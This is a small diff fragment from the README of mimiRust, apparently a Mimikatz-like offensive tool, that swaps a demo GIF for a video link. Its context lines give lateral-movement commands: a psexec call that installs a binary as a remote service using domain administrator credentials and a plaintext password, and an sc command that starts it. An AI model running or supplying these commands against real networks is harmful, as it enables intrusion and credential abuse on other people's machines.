@@ -101,7 +101,7 @@
 <br><h3>Lateral movement through the network</h3>
 <code>psexec /computer:WIN-SJ39U8K8RBS /binary_path:\\WIN-GVVSP2K4NM6\C$\Users\Administrator\Downloads\write.exe /sn:MimiRust /user:THOTTYSPLOITY\Administrator /pass:Welcome01</code><br>
 <code>shell sc \\WIN-SJ39U8K8RBS start MimiRust</code><br>
-<img src="https://github.com/ThottySploity/mimiRust/blob/main/psexec.gif" alt="mimiRust PSexec Demo" width="100%">
+<small>A demo of PSExec function of mimiRust can be found here: https://vimeo.com/707086452</small>
 
 <h2>Demo</h2>
 <small>click on the demo to get a higher resolution</small>
